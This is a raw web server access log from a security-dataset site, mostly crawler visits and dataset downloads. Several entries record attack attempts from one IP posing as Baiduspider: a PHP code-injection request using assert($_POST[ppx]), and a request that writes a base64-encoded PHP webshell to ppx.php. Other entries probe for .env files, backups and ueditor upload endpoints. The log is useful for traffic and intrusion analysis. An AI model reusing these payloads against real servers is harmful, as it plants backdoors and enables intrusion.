66.249.64.121 - - [04/May/2023:14:24:53 -0700] "GET / HTTP/1.1" 200 13183 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.142 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.121 - - [04/May/2023:14:24:57 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.142 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.121 - - [04/May/2023:14:24:57 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.142 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.70.70 - - [04/May/2023:14:25:52 -0700] "GET /ads.txt HTTP/1.1" 301 489 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
207.46.13.217 - - [04/May/2023:14:32:48 -0700] "GET /Datasets%20Description/PE_malware/VirusShare.html HTTP/1.1" 200 1651 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36" 
51.222.253.9 - - [04/May/2023:14:35:11 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/?C=S;O=A HTTP/1.1" 200 783 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
207.46.13.217 - - [04/May/2023:14:39:38 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36" 
52.56.224.246 - - [04/May/2023:14:41:31 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0" 
52.56.224.246 - - [04/May/2023:14:41:31 -0700] "GET / HTTP/1.1" 200 13183 "-" "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0" 
207.46.13.217 - - [04/May/2023:14:42:18 -0700] "GET / HTTP/1.1" 200 13183 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36" 
183.200.12.70 - - [04/May/2023:14:45:54 -0700] "GET / HTTP/1.1" 200 13184 "http://www.secrepo.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
124.222.47.153 - - [04/May/2023:14:56:32 -0700] "GET / HTTP/1.1" 200 49133 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)" 
154.197.26.116 - - [04/May/2023:15:06:20 -0700] "HEAD / HTTP/1.1" 301 223 "http://secrepo.com" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
154.197.26.116 - - [04/May/2023:15:06:21 -0700] "GET / HTTP/1.1" 200 49133 "http://secrepo.com" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
154.197.26.116 - - [04/May/2023:15:06:22 -0700] "HEAD /type.php?template=tag_()%7B%7D;@unlink(FILE);print_r(ppxshell);assert($_POST%5Bppx%5D);%7B//../rss HTTP/1.1" 301 265 "http://secrepo.com/type.php?template=tag_(){};@unlink(FILE);print_r(ppxshell);assert($_POST[ppx]);{//../rss" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
154.197.26.116 - - [04/May/2023:15:06:22 -0700] "GET /type.php?template=tag_()%7B%7D;@unlink(FILE);print_r(ppxshell);assert($_POST%5Bppx%5D);%7B//../rss HTTP/1.1" 418 691 "http://secrepo.com/type.php?template=tag_(){};@unlink(FILE);print_r(ppxshell);assert($_POST[ppx]);{//../rss" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
154.197.26.116 - - [04/May/2023:15:06:22 -0700] "HEAD /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 301 213 "http://secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
154.197.26.116 - - [04/May/2023:15:06:22 -0700] "GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 250 "http://secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
154.197.26.116 - - [04/May/2023:15:06:23 -0700] "POST /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 301 523 "http://secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
154.197.26.116 - - [04/May/2023:15:06:23 -0700] "GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 250 "http://secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
154.197.26.116 - - [04/May/2023:15:06:23 -0700] "HEAD /index.php?a=fetch&content=%3C?php+file_put_contents(%22ppx.php%22,%20base64_decode(%22PD9waHANCmNsYXNzIFZNVFh7DQogICAgZnVuY3Rpb24gX19kZXN0cnVjdCgpew0KICAgICAgICAkQlJMST0nZiR2amNUJ14ieDd4NTd4NXhmeDExeDIwIjsNCiAgICAgICAgcmV0dXJuIEAkQlJMSSgiJHRoaXMtPkVLREwiKTsNCiAgICB9DQp9DQokdm10eD1uZXcgVk1UWCgpOw0KQCR2bXR4LT5FS0RMPWlzc2V0KCRfR0VUWydpZCddKT9iYXNlNjRfZGVjb2RlKCRfUE9TVFsncHB4J10pOiRfUE9TVFsncHB4J107DQo/Pg0KDQoNCnBweHdlYnNoZWxs%22)); HTTP/1.1" 301 599 "http://secrepo.com/index.php?a=fetch&content=<?php+file_put_contents(\"ppx.php\", base64_decode(\"PD9waHANCmNsYXNzIFZNVFh7DQogICAgZnVuY3Rpb24gX19kZXN0cnVjdCgpew0KICAgICAgICAkQlJMST0nZiR2amNUJ14ieDd4NTd4NXhmeDExeDIwIjsNCiAgICAgICAgcmV0dXJuIEAkQlJMSSgiJHRoaXMtPkVLREwiKTsNCiAgICB9DQp9DQokdm10eD1uZXcgVk1UWCgpOw0KQCR2bXR4LT5FS0RMPWlzc2V0KCRfR0VUWydpZCddKT9iYXNlNjRfZGVjb2RlKCRfUE9TVFsncHB4J10pOiRfUE9TVFsncHB4J107DQo/Pg0KDQoNCnBweHdlYnNoZWxs\"));" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
154.197.26.116 - - [04/May/2023:15:06:23 -0700] "GET /index.php?a=fetch&content=%3C?php+file_put_contents(%22ppx.php%22,%20base64_decode(%22PD9waHANCmNsYXNzIFZNVFh7DQogICAgZnVuY3Rpb24gX19kZXN0cnVjdCgpew0KICAgICAgICAkQlJMST0nZiR2amNUJ14ieDd4NTd4NXhmeDExeDIwIjsNCiAgICAgICAgcmV0dXJuIEAkQlJMSSgiJHRoaXMtPkVLREwiKTsNCiAgICB9DQp9DQokdm10eD1uZXcgVk1UWCgpOw0KQCR2bXR4LT5FS0RMPWlzc2V0KCRfR0VUWydpZCddKT9iYXNlNjRfZGVjb2RlKCRfUE9TVFsncHB4J10pOiRfUE9TVFsncHB4J107DQo/Pg0KDQoNCnBweHdlYnNoZWxs%22)); HTTP/1.1" 418 691 "http://secrepo.com/index.php?a=fetch&content=<?php+file_put_contents(\"ppx.php\", base64_decode(\"PD9waHANCmNsYXNzIFZNVFh7DQogICAgZnVuY3Rpb24gX19kZXN0cnVjdCgpew0KICAgICAgICAkQlJMST0nZiR2amNUJ14ieDd4NTd4NXhmeDExeDIwIjsNCiAgICAgICAgcmV0dXJuIEAkQlJMSSgiJHRoaXMtPkVLREwiKTsNCiAgICB9DQp9DQokdm10eD1uZXcgVk1UWCgpOw0KQCR2bXR4LT5FS0RMPWlzc2V0KCRfR0VUWydpZCddKT9iYXNlNjRfZGVjb2RlKCRfUE9TVFsncHB4J10pOiRfUE9TVFsncHB4J107DQo/Pg0KDQoNCnBweHdlYnNoZWxs\"));" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
154.197.26.116 - - [04/May/2023:15:06:24 -0700] "HEAD /index.php HTTP/1.1" 301 176 "http://secrepo.com/index.php" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
154.197.26.116 - - [04/May/2023:15:06:24 -0700] "GET /index.php HTTP/1.1" 404 250 "http://secrepo.com/index.php" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
180.94.151.39 - - [04/May/2023:15:10:35 -0700] "GET /backup.zip HTTP/1.1" 429 439 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" 
114.119.135.7 - - [04/May/2023:15:47:35 -0700] "GET /self.logs/access.log.2019-04-12.gz HTTP/1.1" 200 20172 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.141.77 - - [04/May/2023:15:50:57 -0700] "GET /self.logs/access.log.2017-12-11.gz HTTP/1.1" 200 31448 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
46.101.158.159 - - [04/May/2023:15:55:21 -0700] "GET /Datasets HTTP/1.1" 301 435 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)" 
46.101.158.159 - - [04/May/2023:15:55:21 -0700] "GET /Datasets HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)" 
54.36.148.51 - - [04/May/2023:16:05:10 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.10 - - [04/May/2023:16:05:11 -0700] "GET /Datasets%20Description/ HTTP/1.1" 200 633 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
114.119.152.12 - - [04/May/2023:16:13:04 -0700] "GET /self.logs/access.log.2019-10-11.gz HTTP/1.1" 200 23032 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.153.169 - - [04/May/2023:16:15:59 -0700] "GET /self.logs/error.log.2020-01-23 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
119.91.145.189 - - [04/May/2023:16:22:57 -0700] "GET /xmlrpc.php HTTP/1.1" 404 328 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0" 
52.167.144.142 - - [04/May/2023:16:24:47 -0700] "GET /self.logs/2016/error.log.2016-10-27.gz HTTP/1.1" 200 894 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36" 
52.167.144.142 - - [04/May/2023:16:26:16 -0700] "GET /self.logs/access.log.2018-03-25.gz HTTP/1.1" 200 17313 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36" 
119.91.145.189 - - [04/May/2023:16:38:39 -0700] "GET /xmlrpc.php HTTP/1.1" 404 328 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0" 
52.167.144.175 - - [04/May/2023:16:47:53 -0700] "GET /self.logs/access.log.2017-01-28.gz HTTP/1.1" 200 17589 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36" 
175.6.175.186 - - [04/May/2023:16:59:35 -0700] "GET /data/admin/allowurl.txt HTTP/1.1" 404 328 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" 
114.119.132.237 - - [04/May/2023:17:06:25 -0700] "GET /self.logs/error.log.2017-09-18.gz HTTP/1.1" 200 2185 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
115.210.68.91 - - [04/May/2023:17:17:27 -0700] "GET /public/admin/lib/ueditor/1.4.3/net/ontroller.ashx?action=catchimage HTTP/1.1" 301 609 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" 
52.167.144.142 - - [04/May/2023:17:18:11 -0700] "GET /self.logs/ HTTP/1.1" 200 42754 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36" 
182.119.162.125 - - [04/May/2023:17:24:52 -0700] "GET /robots.txt HTTP/1.1" 200 340 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
66.108.10.204 - - [04/May/2023:17:25:46 -0700] "GET / HTTP/1.1" 200 13184 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0" 
66.108.10.204 - - [04/May/2023:17:25:46 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0" 
66.108.10.204 - - [04/May/2023:17:25:46 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0" 
66.108.10.204 - - [04/May/2023:17:27:10 -0700] "GET /Datasets%20Description/HTML_Bro_log_1 HTTP/1.1" 301 619 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0" 
66.108.10.204 - - [04/May/2023:17:27:10 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/ HTTP/1.1" 200 811 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0" 
66.108.10.204 - - [04/May/2023:17:27:10 -0700] "GET /favicon.ico HTTP/1.1" 200 368 "http://www.secrepo.com/Datasets%20Description/HTML_Bro_log_1/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0" 
162.55.86.60 - - [04/May/2023:17:28:15 -0700] "GET /robots.txt HTTP/1.1" 301 495 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [04/May/2023:17:28:16 -0700] "GET /robots.txt HTTP/1.1" 200 377 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [04/May/2023:17:28:16 -0700] "GET /sitemap HTTP/1.1" 301 489 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [04/May/2023:17:28:16 -0700] "GET /robots.txt HTTP/1.1" 200 354 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [04/May/2023:17:28:16 -0700] "GET /sitemap HTTP/1.1" 404 328 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [04/May/2023:17:28:46 -0700] "GET /sitemap HTTP/1.1" 404 328 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [04/May/2023:17:29:17 -0700] "GET /sitemap.txt HTTP/1.1" 301 497 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [04/May/2023:17:29:17 -0700] "GET /sitemap.txt HTTP/1.1" 404 328 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [04/May/2023:17:29:47 -0700] "GET /sitemap.txt HTTP/1.1" 404 328 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [04/May/2023:17:30:18 -0700] "GET / HTTP/1.1" 200 13183 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [04/May/2023:17:31:20 -0700] "GET /Datasets%20Description/HTML_Bro_log_1 HTTP/1.1" 301 619 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [04/May/2023:17:31:21 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/ HTTP/1.1" 200 811 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
115.211.226.158 - - [04/May/2023:17:31:33 -0700] "GET /Content/js/plugins/ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 301 603 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" 
162.55.86.60 - - [04/May/2023:17:31:51 -0700] "GET /Datasets%20Description/HTML_Bro_log_2 HTTP/1.1" 301 619 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [04/May/2023:17:31:51 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/ HTTP/1.1" 200 809 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
66.108.10.204 - - [04/May/2023:17:31:56 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 205875776 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0" 
162.55.86.60 - - [04/May/2023:17:32:22 -0700] "GET /Datasets%20Description/HTML_Bro_log_3 HTTP/1.1" 301 619 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [04/May/2023:17:32:22 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/ HTTP/1.1" 200 800 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
66.108.10.204 - - [04/May/2023:17:32:24 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 52502848 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0" 
66.108.10.204 - - [04/May/2023:17:32:32 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 43776240 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0" 
66.108.10.204 - - [04/May/2023:17:32:38 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 270501936 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0" 
162.55.86.60 - - [04/May/2023:17:32:54 -0700] "GET /Datasets%20Description/Network/dhcp.html HTTP/1.1" 200 1461 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
66.108.10.204 - - [04/May/2023:17:33:04 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 61528744 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0" 
66.108.10.204 - - [04/May/2023:17:33:18 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 77823472 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0" 
162.55.86.60 - - [04/May/2023:17:33:24 -0700] "GET /Datasets%20Description/Network/dns.html HTTP/1.1" 200 1543 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
66.108.10.204 - - [04/May/2023:17:33:17 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 151486984 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0" 
162.55.86.60 - - [04/May/2023:17:33:55 -0700] "GET /Datasets%20Description/Network/files.html HTTP/1.1" 200 1532 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [04/May/2023:17:34:25 -0700] "GET /Datasets%20Description/Network/ftp.html HTTP/1.1" 200 1530 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
66.108.10.204 - - [04/May/2023:17:34:00 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 549157753 "-" "Wget/1.20.3 (linux-gnu)" 
162.55.86.60 - - [04/May/2023:17:34:58 -0700] "GET /Datasets%20Description/Network/http.html HTTP/1.1" 200 1709 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [04/May/2023:17:35:28 -0700] "GET /Datasets%20Description/Network/notice.html HTTP/1.1" 200 1650 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [04/May/2023:17:35:59 -0700] "GET /Datasets%20Description/Network/signatures.html HTTP/1.1" 404 328 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [04/May/2023:17:36:30 -0700] "GET /Datasets%20Description/Network/smtp.html HTTP/1.1" 200 1637 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [04/May/2023:17:37:02 -0700] "GET /Datasets%20Description/Network/ssh.html HTTP/1.1" 200 1368 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
66.108.10.204 - - [04/May/2023:17:37:16 -0700] "GET /maccdc2012/dhcp.log.gz HTTP/1.1" 200 44977 "-" "Wget/1.20.3 (linux-gnu)" 
162.55.86.60 - - [04/May/2023:17:37:33 -0700] "GET /Datasets%20Description/Network/ssl.html HTTP/1.1" 200 1585 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [04/May/2023:17:38:03 -0700] "GET /Datasets%20Description/Network/tunnel.html HTTP/1.1" 200 1470 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [04/May/2023:17:38:34 -0700] "GET /Datasets%20Description/Network/weird.html HTTP/1.1" 200 1645 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
114.119.133.98 - - [04/May/2023:17:38:36 -0700] "GET /self.logs/access.log.2017-08-27.gz HTTP/1.1" 200 20038 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
162.55.86.60 - - [04/May/2023:17:39:04 -0700] "GET /Datasets%20Description/PE_malware/OPCleaver.html HTTP/1.1" 200 1458 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [04/May/2023:17:39:34 -0700] "GET /Datasets%20Description/PE_malware/VirusShare.html HTTP/1.1" 200 1651 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [04/May/2023:17:40:05 -0700] "GET /Datasets%20Description/PE_malware/Zeus.html HTTP/1.1" 200 1698 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [04/May/2023:17:40:36 -0700] "GET /data HTTP/1.1" 404 328 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [04/May/2023:17:41:06 -0700] "GET /self.logs/ HTTP/1.1" 200 42754 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
115.211.226.158 - - [04/May/2023:17:42:42 -0700] "GET /Common/ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 301 579 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" 
182.148.14.196 - - [04/May/2023:17:47:08 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.68" 
192.3.221.137 - - [04/May/2023:17:47:39 -0700] "GET /.env HTTP/1.1" 404 519 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" 
192.3.221.137 - - [04/May/2023:17:47:48 -0700] "POST / HTTP/1.1" 200 13184 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" 
183.155.248.63 - - [04/May/2023:18:13:14 -0700] "GET /lib/ueditor/1.4.3/net/controller.ashx?action=catchimage HTTP/1.1" 301 585 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" 
140.246.98.186 - - [04/May/2023:18:15:08 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
140.246.98.186 - - [04/May/2023:18:15:20 -0700] "GET / HTTP/1.1" 200 13184 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
173.249.2.13 - - [04/May/2023:18:19:07 -0700] "GET /robots.txt HTTP/1.1" 200 377 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
173.249.2.13 - - [04/May/2023:18:19:17 -0700] "GET /self.logs/error.log.2022-01-03 HTTP/1.1" 200 84421 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
